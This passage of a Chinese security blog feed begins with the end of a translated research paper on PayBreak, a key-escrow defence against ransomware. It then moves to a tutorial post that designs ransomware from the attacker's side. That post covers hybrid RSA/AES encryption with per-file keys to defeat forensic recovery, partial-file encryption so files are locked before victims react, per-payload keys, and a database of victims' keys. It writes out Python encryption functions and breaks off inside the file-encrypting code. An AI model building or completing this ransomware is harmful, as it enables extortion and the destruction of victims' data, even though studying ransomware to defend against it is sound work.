Impacts</h2><p>在本节中，我们回答RQ3，它评估了PayBreak对性能的影响。对于这个问题，我们对两个特征感兴趣。PayBreak对单个调用加密API（即微型基准）会造成何种放缓，以及在常规办公室工作负载（即宏基准）期间对加密API的调用频率如何。我们评估了运行Windows 7 32位虚拟机，2GB RAM和2个2.20GHzCPU内核的一般笔记本电脑的性能。</p><h3 id="micro-benchmark">Micro benchmark</h3><p>为了衡量使用Detourshook的CryptoAPI函数的系统开销，我们在1KB文件上执行了1000万次CryptEncryptAPI调用的微基准测试。我们发现在没有hook的情况下花费了4.02s。启用PayBreak，将会话密钥和加密方案信息导出到密钥库后，加密循环花费了1,242s。因此，平均一次对CryptEncryptAPI的调用要花费124µs（即速度降低310倍）。但是，大多数性能影响来自写入密钥库的I/ O操作。 从测量中省略磁盘I /O可使速度降低到1.5倍。因此，PayBreak的简单性能优化可以是在专用 I/O线程中执行对密钥库的写入操作，实际的工作负载比上面讨论的综合最坏情况基准遭受的性能影响要小得多。</p><h3 id="macro-benchmark">Macro benchmark</h3><p>尽管对加密API的单个调用的相对性能影响很大，但是在常规办公室工作负载中这种操作极为罕见。对于我们的宏基准测试，我们在配备PayBreak的虚拟机上使用了常见的Windows软件。我们执行的Windows软件包括：7zip，AVG，Dropbox，Firefox，Gimp 2，GoogleChrome，Google Drive，Internet Explorer（IE），iTunes，KeePass2，LibreOffice，Microsoft Excel，Microsoft Powerpoint，MicrosoftWord，Pidgin，Putty， RealVNC，Skype，SumatraPDF，WinSCP，WinZip。</p><p>由于篇幅所限，我们无法针对我们测试的每个应用程序完整分析我们的测试程序。但是，我们提供了对五个应用程序分析的报告。我们发现任何应用程序都没有明显的速度下降，并且常规应用程序使用期间平均少于100个加密API调用。每个应用程序名称后面的括号中的数字是我们在测试期间从应用程序记录的CryptoAPI调用的数量。</p><h4 id="keepass-2-28">KeePass 2 (28)</h4><p>我们创建了一个新的密码数据库，并使用该应用程序随机生成了3个密码。我们删除了该数据库，并创建了一个新的空数据库。然后，我们导入了一个旧数据库。我们注意到任何这些操作都没有变慢，并且该应用程序完全正常工作。 KeePass2似乎是CryptoAPI的不同用户，因为我们观察到CryptoAPI被调用的六个不同功能。</p><h4 id="dropbox-127">Dropbox (127)</h4><p>我们使用该程序登录了一个Dropbox帐户。然后，我们将该帐户中先前存放在本地计算机上的3个文件同步。然后，通过将文件拖到Dropbox文件夹中，将5个文件从本地计算机同步到云中。我们注意到同步期间没有速度下降，也没有程序崩溃。在我们的测试期间，Dropbox进行的大多数CryptoAPI调用都是针对CryptGenRandom的。</p><h4 id="putty-2">Putty (2)</h4><p>我们连接了远程SSH服务器并执行了几个命令，随后与服务器断开连接。此应用程序并不频繁调用CryptoAPI，我们没有发现速度变慢或程序不稳定的情况。</p><h4 id="skype-19418">Skype (19,418)</h4><p>我们创建了一个Skype帐户， 添加了2个联系人并发送了消息。然后，我们给这些联系人中的1个打电话。Skype频繁调用CryptoAPI，比我们观察到的任何其他程序都要多。但是，即使使用率如此之高，也远远超过任何其他程序，我们也没有发现速度减慢或程序不稳定。</p><h4 id="internet-explorer-3328">Internet Explorer (3,328)</h4><p>我们使用<ahref="https://www.autoitscript.com/site/autoit/">AutoIt</a>程序来实现IE自动化，从而在其HTTPS主页上访问Alexa最受欢迎的100个网站。我们在每个页面上停留5秒钟以让页面完全加载。我们发现每个网页（包括所有资源）平均对CryptoAPI调用33次。因此，即使每次加密操作未优化的减慢速度为124µs，这也导致页面加载的开销仅为4.1ms，明显低于人类的感知阈值。</p><h1 id="讨论和系统限制">讨论和系统限制</h1><p>在本节中，我们将讨论尽管我们的系统存在或由于我们的系统而存在的挑战、开放性问题和限制。一个微不足道的，看似有效的防御勒索软件是一个可靠的备份。有了这样一个备份，用户就不用担心勒索软件的攻击了，恢复所需的只是擦除并重新安装受感染的计算机，并从备份中恢复数据。虽然很简单，但显然过去成为勒索软件受害者并支付赎金的用户并没有这种简单的机制。不幸的是，让所有用户全面使用备份似乎是不现实的。</p><p>此外，据报道，一些最近的勒索软件系列（例如RansomWeb或CryptoWall）在感染后立即加密文件，并通过在访问时透明地解密数据来在有限的时间段（例如几个月）内提供对数据的访问权限。一旦此初始期限到期，恶意软件就会破坏解密所需的密钥，并要求勒索。在这一点上，自感染以来（假如只有几个月）进行的所有备份仅包含加密数据，因此无法从感染中恢复。</p><p>PayBreak的核心是一个关键托管系统。政府提出并强制要求的密钥代管制度一直受到研究界和隐私权倡导者的批判。我们完全赞同这一观点，并强烈反对政府规定的密钥代管制度。但是，此类政府强制性提案与PayBreak之间存在根本差异。在PayBreak中，仅存在一个有权访问保存在密钥库中的密钥的实体-合法用户自己。也就是说，除了用户本人之外，没有可信任的第三方。</p><p>我们的PayBreak原型实现使用多个动态或静态链接的库来击败勒索软件。勒索软件的作者可能会为了破解PayBreak而尝试推出自己的密码库。但是，这通常会导致软件的失败（例如，僵尸网络管理员使用的简单加密使他们的C＆C协议易于逆向），因此勒索软件作者更倾向于利用安全的第三方库。但是，安全的加密库很少，只有有限的一些可供选择。而对于我们的系统来说，为第三方库或自定义库创建签名并没有难度。我们使用三种不同的库的测试经验表明，可以轻松快速地添加对更多库的支持。例如，我们开发了在一天之内检测Crypto++所需的签名。此外，我们的原型还hook了Windows标准的CSPRNG函数CryptGenRandom。通过动态hooking并记录该系统功能，PayBreak可以利用任何其他勒索软件库存储任何勒索软件使用的会话密钥的基础资料。无论使用什么代码，恶意软件分析人员只需识别一次加密实现，并将其添加到PayBreak即可添加支持。识别密码不必是手工的，相反，可以通过多种方式使该过程自动化。一旦识别出密码，便存在大量有助于识别相似代码的工作。为了完全避开对称密钥的使用，勒索软件的作者可能会倾向于使用完全非对称的原语来加密数据。尽管这种策略是可行的，但可以通过监视这些方面的启发式方法来解决高资源需求和非对称加密异常频繁地使用的问题。尽管PayBreak表现出了对当代加密勒索软件的有效性，但实际部署仍必须解决本文未涉及的几个问题。这些问题包括，例如，用户如何保护私钥的安全，或为密钥库实施安全的轮转系统，以防止库的无限增长。</p><p>如前所述，PayBreak能够在几小时内从勒索软件攻击中恢复，通过详尽搜索，文件恢复独立于勒索软件。这种详尽的搜索是一种并行的工作负载，因此可以使用其他计算资源（例如云部署）几乎任意地进行优化。此外，需要从勒索软件感染中恢复应该是一种罕见的特定情况。我们认为，对于常规的勒索软件受害者而言，与可恢复加密文件的速度相比，重新获得对加密数据的访问更为重要。</p><p>我们承认，与大部分实用的在线保护系统一样，混淆和加壳可以破坏PayBreak提供的保护。但是，混淆只是静态链接到加密库的恶意软件的关注点。由于使用PayBreak会在未混淆的系统DLL中挂钩API函数的实现，因此不会受到使用系统提供的CryptoAPI的恶意软件的绕过。此外，正如我们的评估所示，PayBreak完全能够保护用户免受静态链接加密库的恶意软件的侵害，只要该恶意软件被现代加壳程序所混淆即可。实际上，所有用于评估的恶意软件样本都已加壳，而且来自Tox家族的样本静态链接了Crypto++库。多年来，学术文献和商业资源已提供了高级混淆器。但是，这些先进技术并未在整个恶意软件生态系统中广泛使用。例如，Sun<sup id="fnref:6" class="footnote-ref"><a href="#fn:6" rel="footnote"><spanclass="hint--top hint--rounded"aria-label="L. Sun. Reform: A framework for malware packer analysis using information theory and statistical methods, 2010.">[6]</span></a></sup>报告说，在103,392个分析的样本中，有91％仅使用简单的加壳软件（例如UPX或ASPack），这些壳不会绕过PayBreak提供的保护。不幸的是，我们不知道阻止恶意软件作者广泛使用更高级的混淆技术的原因，因此，PayBreak提高了恶意软件作者的门槛，并迫使他们使用迄今为止他们一直拒绝采用的绕过技术。</p><p>恶意软件可以实施的另一种绕过PayBreak的方法即检测到受害者的计算机中是否正在运行PayBreak，并因此跳过插入的hook。但是，没有理由PayBreak必须在目标加密功能的开头安装hook。只要相关数据结构（例如密钥和加密方案参数）仍在使用范围内，我们可以修改PayBreak以将hook插入函数中的任意点。与混淆情形类似，PayBreak无法提供针对专门旨在绕过PayBreak的恶意软件的保证，但是PayBreak可以大大减少攻击者成功的几率。</p><p>最后，发现PayBreak存在的勒索软件可以通过破坏用于在保管库中保管数据的公钥或简单地用无意义的信息填充保管库来发起DOS攻击。可以将PayBreak修改为具有附加到Vault的特权（如以SYSTEM身份运行）进程，从而保护公钥的完整性。在对受害者的文件进行加密之前，使文件库充满垃圾的攻击只能增加恢复加密文件所需的时间，上面提到的特权进程也可以检测到这种攻击的进行，并向用户发出警报，或者终止有问题的过程。即使这种攻击没有引起警报，请回想一下，感染勒索软件是一种罕见的情况，而识别正确的密钥和加密偏移量则很尴尬。因此，即使使用大型保管库（一个1TB的保管库可以容纳大约170亿个条目），恢复也只会被延迟，而不能阻止。</p><h1 id="总结">总结</h1><p>PayBreak是一种创新的保护机制，可以解决基于加密的勒索软件的威胁。早期的勒索软件系列由于未正确配置加密模式而失败，因而成功的软件转而使用正确的加密方法——混合加密。我们研究确定了大部分的勒索软件都必须在受害者的主机上使用对称会话密钥来执行文件加密，因此PayBreak实现了密钥托管机制，将会话密钥存储在密钥库中并使用用户的公共密钥加密，只有用户的私钥才能解锁该密钥库。与政府强制的密钥托管系统相反，PayBreak确保只有合法用户才能访问托管的密钥。我们对107个勒索软件样本进行了测试，并证明PayBreak可以成功地从十二种不同勒索软件系列所造成的损害中恢复，同时其运行时开销远远低于人类的感知阈值，因此可以在日常工作环境钟使用PayBreak。最后，PayBreak将作为一个公开可用的开源项目发布<sup id="fnref:7" class="footnote-ref"><a href="#fn:7" rel="footnote"><spanclass="hint--top hint--rounded"aria-label="[https://github.com/BUseclab/paybreak](https://github.com/BUseclab/paybreak)">[7]</span></a></sup>。</p><h1 id="参考">参考</h1><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><ahref="https://mundi-xu.github.io/2020/12/28/勒索软件结构与加密模式研究/">勒索软件结构与加密模式研究</a><a href="#fnref:1" rev="footnote" class="footnote-backref">↩︎</a></span></span></li><li><span id="fn:2" class="footnote-text"><span>P. Lestringant, F. Guih´ery,and P.-A. Fouque. Automated identification of cryptographic primitivesin binary code with data flow graph isomorphism. In Proceedings of the10th ACM Symposium on Information, Computer and Communications Security,ASIA CCS ’15, 2015.<a href="#fnref:2" rev="footnote" class="footnote-backref">↩︎</a></span></span></li><li><span id="fn:3"class="footnote-text"><span><a href="https://www.ietf.org/rfc/rfc5652.txt">CryptographicMessage Syntax (CMS)</a><a href="#fnref:3" rev="footnote" class="footnote-backref">↩︎</a></span></span></li><li><span id="fn:4"class="footnote-text"><span><a href="http://www.darwinsys.com/file/">FineFree File Command</a><a href="#fnref:4" rev="footnote" class="footnote-backref">↩︎</a></span></span></li><li><span id="fn:5" class="footnote-text"><span>A. Kharraz, W. Robertson, D.Balzarotti, L. Bilge, and E. Kirda. Cutting the Gordian Knot: A LookUnder the Hood of Ransomware Attacks. In Proceedings of theInternational Conference on Detection of Intrusions and Malware, andVulnerability Assessment (DIMVA), volume 9148 of Lecture Notes inComputer Science, Milan, Italy, July 2015. Springer InternationalPublishing. <a href="#fnref:5" rev="footnote" class="footnote-backref">↩︎</a></span></span></li><li><span id="fn:6" class="footnote-text"><span>L. Sun. Reform: A frameworkfor malware packer analysis using information theory and statisticalmethods, 2010.<a href="#fnref:6" rev="footnote" class="footnote-backref">↩︎</a></span></span></li><li><span id="fn:7" class="footnote-text"><span><ahref="https://github.com/BUseclab/paybreak">https://github.com/BUseclab/paybreak</a><a href="#fnref:7" rev="footnote" class="footnote-backref">↩︎</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>Security Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Ransomware</tag>
      
      <tag>Malware</tag>
      
      <tag>Key Escrow</tag>
      
      <tag>Hybrid Cryptosystem</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>勒索软件结构与加密模式研究</title>
    <link href="/2020/12/28/Research-on-Ransomware-Structure-and-Encryption-Mode/"/>
    <url>/2020/12/28/Research-on-Ransomware-Structure-and-Encryption-Mode/</url>
    
    <content type="html"><![CDATA[<blockquote><p>One of the best ways of learning how something truly works is to tryto build it yourself.<br />本文的目的仅为分享有关勒索软件恶意软件的知识，任何人不得将其用于恶意目的。</p></blockquote><h1 id="基本加密类型">基本加密类型</h1><p>在对勒索软件的研究中最重要的概念之一就是它使用的加密类型，其中主流勒索软件均使用以下两种，具体可参阅密码学相关文献。</p><h2 id="对称加密">对称加密</h2><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/勒索软件结构与加密模式研究/Symmetric_encryption.png"alt="Same key for each process" /><figcaption aria-hidden="true">Same key for each process</figcaption></figure><p>对称加密是大多数人都熟悉的加密技术，其使用同一个密钥来加密或解密数据，常用于zip文件或Office文档之类的加密。</p><h2 id="非对称加密">非对称加密</h2><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/勒索软件结构与加密模式研究/Asymmetric_encryption.png"alt="Different keys for each process" /><figcaption aria-hidden="true">Different keys for eachprocess</figcaption></figure><p>非对称加密的具体实现可能较为难以理解，但其应用还是简明易懂的。</p><p>非对称加密算法需要两个密钥：公开密钥（publickey:简称公钥）和私有密钥（privatekey:简称私钥）。公钥与私钥是一对，如果用公钥对数据进行加密，只有用对应的私钥才能解密。因为加密和解密使用的是两个不同的密钥，所以这种算法叫作非对称加密算法。非对称加密算法实现机密信息交换的基本过程是：甲方生成一对密钥并将公钥公开，需要向甲方发送信息的其他角色(乙方)使用该密钥(甲方的公钥)对机密信息进行加密后再发送给甲方；甲方再用自己私钥对加密后的信息进行解密。甲方想要回复乙方时正好相反，使用乙方的公钥对数据进行加密，同理，乙方使用自己的私钥来进行解密。</p><p>另一方面，甲方可以使用自己的私钥对机密信息进行签名后再发送给乙方；乙方再用甲方的公钥对甲方发送回来的数据进行验签。其目的不是为了保密，而是证明您是发送该消息的人（就像签名在现实生活中一样有效）。甲方只能用其私钥解密由其公钥加密后的任何信息。非对称加密算法的保密性比较好，它消除了最终用户交换密钥的需要。</p><h1 id="勒索软件相关应用">勒索软件相关应用</h1><p>让我们考虑一下正常情况下被勒索软件感染的流程。其payload通过多种方式（钓鱼，软件漏洞等）传播，并在目标计算机上运行从而加密目标的所有文件。之后，用弹窗或其他醒目的方式要求受害者交钱以获取解密文件的方法。所以我们应该怎样才能做到这些呢？</p><p>我们的第一个反应肯定是对文件使用对称加密，但这是错误的，并且任何一个正常的勒索软件都会出于一个重要原因而避免这样做。当勒索软件正在加密受害者的文件时，加密密钥将需要出现在某个地方。如果使用对称加密，则用于加密的加密密钥也可以用于解密。这意味着合格的取证专家可以恢复感染期间用于加密的密钥，然后使用它来解密文件。当使用非对称加密时，我们使用不同的密钥进行加密和解密，因此，只要确保解密密钥的安全，即使在受害者计算机中存储加密密钥也不是什么大问题。</p><p>我们需要考虑的另一件重要事情是，作为攻击者，我们需要拥有密钥，以便受害者决定支付赎金时解密文件。使用对称加密时，我们需要在二进制代码上对密钥进行硬编码（而这有多种方法可以逆转），或者即时生成它，然后使用某种方式将其传输到攻击者的服务器（这也是一个坏主意，因为它可能在传输过程中被截获，并且如果目标计算机断网，因为没有密钥，我们将无法为受害者解密文件。）像这样的方案曾在CryptoDefense的第一代产品中使用，并允许受害者自行解密文件<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><spanclass="hint--top hint--rounded"aria-label="">[1]</span></a></sup>。因为密钥既在生成后传输到服务器，缺又意外的留在了本地文件系统中。</p><p>而这就意味着我们必须使用非对称加密来加密受害者文件吗？我们可以生成一个密钥对，在代码上对公共密钥进行硬编码，然后用该密钥对所有内容进行加密（将私有密钥妥善保存）？不，我们不能。</p><p>当您尝试这么干时，一个显而易见的原因就是非对称加密比对称加密要慢几个数量级。当您加密受害者的硬盘时，您需要尽快加密所有内容。如果完全加密文件需要要花费几分钟以上，那么受害者可能会注意到其文件已被加密，而这时只需简单的关闭计算机即可。这将使他能够从硬盘驱动器中保护剩余的文件。</p><p>那么我们应该使用什么呢？</p><h1 id="混合加密">混合加密</h1><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/勒索软件结构与加密模式研究/我全都要.jpg"alt="小孩子才做选择,( )" /><figcaption aria-hidden="true">小孩子才做选择,( )</figcaption></figure><p>为了解决此问题，我们可以使用混合方法。当生成payload时，我们还将生成与该payload相关联的一组公用/专用密钥。我们在该特定payload中对​​公钥进行编码，并且每当发生感染时，payload都会生成一个用于对称加密的密钥。加密后，我们使用硬编码的公钥对对称密钥进行加密（当然，明文存储的对称密钥会从内存/磁盘中销毁）。这个加密的对称密钥被保存在机器上的某个地方，并在赎金记录中要求受害者提供此密钥。</p><p>但是我们还有另一个问题。</p><h2 id="密钥复用和选择明文攻击">密钥复用和选择明文攻击</h2><p><ahref="https://simple.wikipedia.org/wiki/Chosen-plaintext_attack">选择明文攻击</a>：攻击者在开始攻击时可以选择一些明文，并获取加密后的密文。如果攻击者在攻击中途可以根据已经获取的信息选择新的明文并获取对应的密文，则称为适应性选择明文攻击。其是一种加密攻击，其中，攻击者在加密之前就知道了明文，并给出了足够大的加密文件样本，从理论上讲，密钥可以从加密结果中得出。大多数文件的header（具有已知格式）都可能发生这种情况。如果我们在给定条件的情况下对所有文件使用相同的密钥，则理论上可以恢复该密钥。这实际上正是DirCrypt发生的事情<sup id="fnref:2" class="footnote-ref"><a href="#fn:2" rel="footnote"><spanclass="hint--top hint--rounded"aria-label="">[2]</span></a></sup>。其由于不合适的密码实现和密钥复用，加密过程被逆转了。</p><p>我们可以通过为每个文件使用不同的密钥来解决此问题。我们可以为每个文件生成对称密钥来对文件进行加密，同时使用payload中的公共密钥加密密钥，将加密的对称密钥写入某个位置，然后删除明文对称密钥。</p><p>许多勒索软件都使用这种方法，在这种加密模式中，它们生成一个文本文件，其中包含每个加密的文件名和与其关联的加密的公共密钥。使用解密工具时，它将读取文本文件，使用私钥解密每个密钥，然后使用解密后的密钥解密文本文件。但我们将使用一些不同的东西。</p><blockquote><p>技术说明：这种类型的攻击实际上并不影响我们将使用的对称加密密码（AES-256），因为默认情况下，它对每个文件流使用不同的随机初始化矢量（IV），但我想解释一下这个适用于所有勒索软件的概念。如果勒索软件的开发人员犯了一个错误，这可能会帮助您恢复数据。<br />实际上，这种攻击实际上可能会影响RSA加密，因为它的最基本形式不是随机的。但在我们的情况下，这将不是问题，因为我们使用RSA加密的唯一文件是AES加密密钥，并且它们既不构成要分析的大样本也不是同类样本，并且我们将使用RSA加上最佳非对称加密填充，可为加密增加随机性。</p></blockquote><p>对每个文件使用不同的密钥的另一个优点是可以在加密每个文件后删除该加密密钥，因此，如果任何受害者试图恢复该密钥，他将只能恢复用于最后一个文件加密的密钥。如果我们对所有文件使用相同的密钥，则可以在加密过程的任何部分中恢复密钥，并且所有文件都是可恢复的。</p><h2 id="加密速度">加密速度</h2><p>在对勒索软件进行编译时，原始版本使用了我到目前为止所介绍的所有功能，但结果有些令人失望。当使用32位密钥（AES-256）时，初始基准测试显示加密速度约为每分钟1GB。当然，这种速度在很大程度上取决于受害者的硬件，而我使用的是VM，因为我不想意外地加密我的开发计算机，但是花16分钟的时间来加密一个简单的1TB硬盘显然并不合适。</p><p>那么，现代的勒索软件是如何在几秒钟内加密几千兆字节的信息的？答案在于文件结构。</p><p>实际上对正常操作系统而言，并不需要加密整个文件即可使其不可用。根据文件格式，对header和前几个字节进行加密就足以使整个文件不可读。我们可能可以加密每个文件的前5兆字节。当然，使用诸如strings之类的东西仍然可以读取诸如txt/ascii文件之类的简单文件，但是大多数情况下，这些文件的权重不会超过几个kb。此外，受害者最珍贵的文件通常是文档，图片和视频。即使您仍然可以尝试对部分文件进行取证分析并恢复某些内容，但这是一种手动方法，需要对每个单独的文件进行操作，这一点都不实用。</p><p>更改文件的结尾的想法也很好，我们可以通过在结尾处添加几个特定结构来利用这一点。</p><ol type="1"><li>初始化向量：使用AES加密文件时，您需要一种称为初始化向量的东西。这是在加密过程开始时生成的。</li><li>加密解密密钥：我们还可以将加密解密的密钥附加到每个文件的末尾，这将不用存储每个文件的解密密钥。</li></ol><p>加密的文件结构最终将变成如下所示：</p><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/勒索软件结构与加密模式研究/file_structure.png"alt="Rough mock up of the file structure after decryption" /><figcaption aria-hidden="true">Rough mock up of the file structure afterdecryption</figcaption></figure><p>只加密文件的一部分的另一个优点是它允许我们处理同一文件而不是生成新的加密文件并删除旧文件，而这在边界情况下很有用。在这种情况下，我们有权写入现有文件，但不能创建新文件，它还允许我们快速处理非常大的文件（类似500G的MySQL数据库）。</p><h1 id="整体架构">整体架构</h1><p>为每个进程选择适当的加密方式后，我们将需要设计整体架构来传播此恶意软件，这将涉及自动为每个payload创建一组密钥的过程，因为我们不希望所有受害者共享同一密钥（如果一个人支付了赎金，它可以分发密钥，从而使每个人都可以解密他们的加密文件）。我们还需要保留与每个受害者关联的密钥的数据库。</p><p>为单个payload生成非对称密钥可以使用以下ssh-keygen命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ssh-keygen -b 2048 -m pem -f pem<br></code></pre></td></tr></table></figure><h2 id="开发语言选择">开发语言选择</h2><p>只要您避免使用特定于操作系统的指令（例如用os.system调用的指令），即跨平台的同时速度也要很快（<del>rust</del>），并且具有我们需要执行的大多数加密操作的库。最后，它最好允许混淆编译后的代码，这样能使最终二进制文件的逆向更加困难。这里我们选择了python(显而易见？)。</p><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/勒索软件结构与加密模式研究/python.png"alt="python" /><figcaption aria-hidden="true">python</figcaption></figure><p>在选择python库时，我们可能会导入多种看上去功能相同的库，这是为了选择其中最有效的一个，特别是在密码学这种不断变化的领域。毕竟，过时的加密库或者自建的加密方案可能会导致软件的漏洞<sup id="fnref:3" class="footnote-ref"><a href="#fn:3" rel="footnote"><spanclass="hint--top hint--rounded"aria-label="">[3]</span></a></sup>。我们将使用两个知名的python库：<ahref="https://pypi.org/project/pycryptodome/">pycryptodome</a>和<ahref="https://docs.python.org/3/library/secrets.html">secrets</a>。</p><blockquote><p>实际上，可以使用<ahref="https://pypi.org/project/asymcrypt/">asymcrypt</a>。但是，我将使用直接的pycryptodome并创建每个函数来更好地说明概念。</p></blockquote><h2 id="主要函数">主要函数</h2><ul><li><code>generate32ByteKey()</code>：生成一个随机的32字节密钥,有多种方法可以做到这一点。可以从<code>/dev/urandom</code>抓取一个字符串并对其进行sha256sum运算，但这用于linux，而我们希望软件跨平台，因此我们将使用python的secrets库，通过<code>secrets.token_hex(32)</code>完成。</li><li><code>rsaEncryptSecret(string，publicKey)</code>：使用公钥非对称加密信息（因此只能使用私钥解密）。这将使我们能够使用publicKey加密每个文件的对称密钥。客户端将使用我们的privateKey解密每个文件的对称密钥，然后使用其自己的对称密钥解密每个文件。</li><li><code>saDecryptSecret(secret, privateKey)</code>：使用私钥解密加密的对称密钥。</li><li><code>symEncryptFile(publicKey, file)</code>：此函数是最复杂的函数，其含有具体的加密逻辑，后文将进行进一步说明。但顾名思义，它用于加密文件。</li><li><code>symDecryptFile(privateKey, file)</code>：解密文件。</li><li><code>symEncryptDirectory(publicKey, dir)</code>：此函数接收目录作为参数，并遍历目录以获取其中的所有文件。之后，它将使用publicKey调用symEncryptFile。</li><li><code>symDecryptDirectory(privateKey, dir)</code>：与symEncryptDirectory类似，顾名思义。。。</li></ul><h3 id="rsaencryptsecret">rsaEncryptSecret</h3><p>使用RSA加密密钥，但RSA在默认情况下不会进行任何随机加密，因此我们将使用<ahref="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding">最佳非对称加密填充</a>（简称OAEP）。这是一种填充方案，可通过添加随机性和单向置换陷门来改进RSA。需要注意的是，当RSA与OAEP一起使用时，所得的密码大小应与模数相同。模数是密钥大小/8，我们使用的是2048位RSA，因此生成的密文应为256字节。</p><p>简单示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">rsaEncryptSecret</span>(<span class="hljs-params">string, publicKey</span>):<br>    public_key = get_key(publicKey, <span class="hljs-literal">None</span>)<br>    <span class="hljs-comment"># Create the cipher object</span><br>    cipher_rsa = PKCS1_OAEP.new(public_key)<br>    <span class="hljs-comment"># We need to encode the string to work with bytes instead of chars</span><br>    bytestrings = <span class="hljs-built_in">str</span>.encode(string)<br>    cipher_text = cipher_rsa.encrypt(bytestrings)<br>    <span class="hljs-comment">#At this point the cipher_text should be 256 bytes in length</span><br>    <span class="hljs-comment"># We&#x27;ll base64 encode it for convenience</span><br>    <span class="hljs-comment"># Remember that a base64 string needs to be divisible by 3, so 256 bytes will become 258 with padding </span><br>    <span class="hljs-keyword">return</span> base64.b64encode(cipher_text)<br></code></pre></td></tr></table></figure><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/勒索软件结构与加密模式研究/base64.png"alt="base64长度计算" /><figcaption aria-hidden="true">base64长度计算</figcaption></figure><h3 id="rsadecryptsecret">RsaDecryptSecret</h3><p>使用给定的私钥解密密文：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">rsaDecryptSecret</span>(<span class="hljs-params">string, privateKey</span>):<br>    <span class="hljs-comment"># We firts import the private Key</span><br>    private_key = get_key(privateKey, <span class="hljs-literal">None</span>)<br>    <span class="hljs-comment"># Decode the base64 encoded string</span><br>    base64DecodedSecret = base64.b64decode(string)<br>    <span class="hljs-comment"># create the cipher object</span><br>    cipher_rsa = PKCS1_OAEP.new(private_key)<br>    <span class="hljs-comment"># Decrypt the content</span><br>    decryptedBytestrings = cipher_rsa.decrypt(base64DecodedSecret)<br>    <span class="hljs-comment"># Remember to convert the decoded cipher from bytes to string</span><br>    decryptedSecret = decryptedBytestrings.decode()<br>    <span class="hljs-keyword">return</span> decryptedSecret<br></code></pre></td></tr></table></figure><h3 id="symencryptfile">SymEncryptFile</h3><p>这是主要的加密函数。工作流程如下：</p><ol type="1"><li><p>使用publicKey和文件路径作为参数调用该函数</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">symEncryptFile</span>(<span class="hljs-params">publicKey，file</span>):<br></code></pre></td></tr></table></figure></p></li><li><p>为指定文件生成一个随机密钥</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">key = generateKey()<br></code></pre></td></tr></table></figure></p></li><li><p>使用publicKey加密随机密钥</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">encriptedKey = rsaEncryptSecret(key，publicKey)<br></code></pre></td></tr></table></figure></p></li><li><p>定义文件的加密大小（n个字节）。</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">buffer_size = <span class="hljs-number">1048576</span><br></code></pre></td></tr></table></figure></p></li><li><p>检查文件是否加密，如已加密，跳过</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> file.endswith(<span class="hljs-string">&quot;.&quot;</span> + cryptoName):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;File is already encrypted, skipping&#x27;</span>)<br><span class="hljs-keyword">return</span><br></code></pre></td></tr></table></figure></p></li><li><p>加密文件的前n个字节并覆盖其内容</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Open the input and output files</span><br>input_file = <span class="hljs-built_in">open</span>(file, <span class="hljs-string">&#x27;r+b&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Encrypting file: &quot;</span>+ file)<br>output_file = <span class="hljs-built_in">open</span>(file + <span class="hljs-string">&#x27;.&#x27;</span> + cryptoName, <span class="hljs-string">&#x27;w+b&#x27;</span>)<br><span class="hljs-comment"># Create the cipher object and encrypt the data</span><br>cipher_encrypt = AES.new(key, AES.MODE_CFB)<br><span class="hljs-comment"># Encrypt file first</span><br>input_file.seek(<span class="hljs-number">0</span>)<br>buffer = input_file.read(buffer_size)<br>ciphered_bytes = cipher_encrypt.encrypt(buffer)<br>input_file.seek(<span 